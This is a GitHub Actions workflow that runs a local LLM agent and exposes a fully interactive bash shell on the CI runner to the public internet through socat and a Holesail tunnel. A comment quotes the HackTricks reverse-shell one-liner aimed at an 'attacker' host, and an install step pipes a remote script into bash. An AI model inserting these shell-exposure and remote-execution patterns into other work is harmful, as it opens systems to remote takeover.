name: Queen (Hermes + Ollama) with Full Interactive Shell

on:
  workflow_dispatch:

permissions:
  contents: write

env:
  OLLAMA_MODEL: granite4:tiny-h
  SHELL_PORT: 2222

jobs:
  queen:
    runs-on: ubuntu-latest
    timeout-minutes: 360
    steps:
      - uses: actions/checkout@v4

      - name: Setup Ollama
        uses: ai-action/setup-ollama@v1

      - name: Pull Ollama model
        run: ollama pull ${{ env.OLLAMA_MODEL }}

      - name: Install Hermes Agent
        run: |
          curl -fsSL https://hermes-agent.nousresearch.com/install.sh | bash
          echo "$HOME/.hermes/bin" >> $GITHUB_PATH
          export PATH="$HOME/.hermes/bin:$PATH"

      - name: Install socat and Holesail
        run: |
          sudo apt-get update -qq
          sudo apt-get install -y socat nodejs npm
          sudo npm install -g holesail

      - name: Start Ollama
        run: ollama serve &

      # ---------- The HackTricks socat method (adapted) ----------
      # In HackTricks, the victim runs: socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:attacker:4444
      # Our runner cannot connect out, so we LISTEN instead.
      # The client (you) connects with socat - or socat file:`tty`...
      - name: Start fully interactive shell server
        run: |
          socat TCP-LISTEN:${{ env.SHELL_PORT }},nodelay,fork EXEC:'env TERM=xterm-256color bash -li',pty,stderr,setsid,sigint,sane &
          sleep 2

      - name: Expose shell with Holesail
        id: holesail
        run: |
          holesail --live ${{ env.SHELL_PORT }} --public > holesail.log 2>&1 &
          sleep 10
          CONNECTION_KEY=$(grep -oP 'hs://[a-zA-Z0-9]+' holesail.log | head -1)
          if [ -z "$CONNECTION_KEY" ]; then
            echo "❌ Failed to get Holesail key"
            cat holesail.log
            exit 1
          fi
          echo "connection_key=$CONNECTION_KEY" >> $GITHUB_OUTPUT

      - name: Print access
        env:
          CONNECTION_KEY: ${{ steps.holesail.outputs.connection_key }}
        run: |
          echo "================================================================="
          echo "🔑 Holesail Connection Key:"
          echo "   $CONNECTION_KEY"
          echo ""
          echo "🌐 HackTricks `socat` PTY method – adapted for GitHub Actions:"
          echo ""
          echo "   The runner is LISTENING (reversed role) because it cannot reach you."
          echo "   Holesail tunnels the runner's port to your local machine."
          echo ""
          echo "   1. Install Holesail and socat on your local machine:"
          echo "      npm install -g holesail"
          echo "      # Ubuntu/Debian: sudo apt-get install socat"
          echo "      # macOS: brew install socat"
          echo ""
          echo "   2. Start the Holesail client (keep this terminal open):"
          echo "      holesail \"$CONNECTION_KEY\" --port ${{ env.SHELL_PORT }}"
          echo ""
          echo "   3. In a NEW terminal, connect with the HackTricks listener command:"
          echo "      socat file:\`tty\`,raw,echo=0 TCP:localhost:${{ env.SHELL_PORT }},nodelay"
          echo ""
          echo "   That's it! You get a full PTY with job control, signals, history."
          echo "   Equivalent to the HackTricks `socat file:`tty`...` listener."
          echo ""
          echo "💡 For an even faster connection (no resize), use:"
          echo "      socat - TCP:localhost:${{ env.SHELL_PORT }},nodelay"
          echo ""
          echo "   Run 'hermes chat --model ${{ env.OLLAMA_MODEL }}' to chat."
          echo "================================================================="
          sleep infinity
